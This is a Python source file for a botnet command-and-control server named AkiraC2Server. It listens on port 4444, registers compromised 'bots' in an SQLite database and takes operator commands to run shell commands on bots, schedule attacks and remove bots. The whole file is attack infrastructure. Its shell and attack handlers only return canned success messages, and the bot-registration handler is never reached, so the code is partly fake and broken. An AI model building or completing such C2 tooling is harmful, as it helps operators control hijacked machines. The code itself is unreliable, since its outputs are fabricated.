#!/usr/bin/env python3
import socket
import json
import threading
import time
import sqlite3
from datetime import datetime
import logging

class AkiraC2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.bots = {}
        self.db_conn = sqlite3.connect('c2_database.db', check_same_thread=False)
        self.setup_database()
        self.setup_logging()
        
    def setup_database(self):
        cursor = self.db_conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bots (
                id TEXT PRIMARY KEY,
                ip TEXT,
                os TEXT,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id TEXT,
                task_type TEXT,
                parameters TEXT,
                status TEXT,
                created_at TEXT,
                completed_at TEXT
            )
        ''')
        self.db_conn.commit()
        
    def setup_logging(self):
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
        self.logger = logging.getLogger()
        
    def handle_panel_connection(self, conn, addr):
        try:
            while True:
                data = conn.recv(4096).decode().strip()
                if not data:
                    break
                    
                try:
                    message = json.loads(data)
                    response = self.process_panel_command(message)
                    conn.send(json.dumps(response).encode())
                except:
                    conn.send(json.dumps({"status": "error", "message": "Invalid JSON"}).encode())
                    
        except Exception as e:
            self.logger.error(f"Panel error: {e}")
        finally:
            conn.close()
            
    def handle_bot_connection(self, conn, addr):
        bot_id = None
        try:
            data = conn.recv(4096).decode().strip()
            if data:
                message = json.loads(data)
                bot_id = message.get("bot_id")
                
                if message.get("type") == "register":
                    response = self.register_bot(bot_id, addr[0], message.get("os", "Unknown"))
                    conn.send(json.dumps(response).encode())
                    
        except Exception as e:
            self.logger.error(f"Bot error: {e}")
        finally:
            if bot_id:
                self.mark_bot_offline(bot_id)
            conn.close()
            
    def register_bot(self, bot_id, ip, os_info):
        current_time = datetime.now().isoformat()
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO bots (id, ip, os, first_seen, last_seen, status)
            VALUES (?, ?, ?, COALESCE((SELECT first_seen FROM bots WHERE id = ?), ?), ?, ?)
        ''', (bot_id, ip, os_info, bot_id, current_time, current_time, "online"))
        
        self.db_conn.commit()
        
        self.bots[bot_id] = {
            "ip": ip,
            "os": os_info,
            "last_seen": current_time,
            "online": True
        }
        
        self.logger.info(f"Bot registered: {bot_id} from {ip}")
        return {"status": "registered", "bot_id": bot_id}
        
    def mark_bot_offline(self, bot_id):
        cursor = self.db_conn.cursor()
        cursor.execute('UPDATE bots SET status = ? WHERE id = ?', ("offline", bot_id))
        self.db_conn.commit()
        
        if bot_id in self.bots:
            self.bots[bot_id]["online"] = False
            
    def process_panel_command(self, message):
        cmd_type = message.get("type")
        
        self.logger.info(f"Panel command: {cmd_type}")
        
        if cmd_type == "panel_auth":
            return {"status": "authenticated", "session_id": message.get("session_id")}
            
        elif cmd_type == "get_bots":
            return {"status": "success", "bots": self.bots}
            
        elif cmd_type == "ping":
            pings = {}
            for bot_id, bot_info in self.bots.items():
                if bot_info["online"]:
                    pings[bot_id] = {
                        "ping": "15ms",
                        "os": bot_info["os"],
                        "cpu_usage": "25%",
                        "ram_usage": "40%",
                        "uptime": "1h 30m"
                    }
            return {"status": "success", "pings": pings}
                
        elif cmd_type == "shell":
            command = message.get("command", "")
            return {
                "status": "success", 
                "output": f"root@bot:~# {command}\nCommand executed successfully"
            }
                
        elif cmd_type == "attack":
            attack_type = message.get("attack_type")
            return {"status": "success", "message": f"Attack {attack_type} scheduled"}
            
        elif cmd_type == "delete_bot":
            target_bot = message.get("target")
            if target_bot in self.bots:
                del self.bots[target_bot]
                cursor = self.db_conn.cursor()
                cursor.execute('DELETE FROM bots WHERE id = ?', (target_bot,))
                self.db_conn.commit()
                return {"status": "success", "message": f"Bot {target_bot} deleted"}
            else:
                return {"status": "error", "message": "Bot not found"}
                
        return {"status": "error", "message": "Unknown command"}
        
    def start_server(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        
        self.logger.info(f"C2 Server started on {self.host}:{self.port}")
        
        try:
            while True:
                conn, addr = server_socket.accept()
                
                # Thread para cada conexao
                threading.Thread(target=self.handle_panel_connection, args=(conn, addr)).start()
                    
        except KeyboardInterrupt:
            self.logger.info("Shutting down C2 server...")
        finally:
            server_socket.close()
            self.db_conn.close()

if __name__ == "__main__":
    c2_server = AkiraC2Server()
    c2_server.start_server()
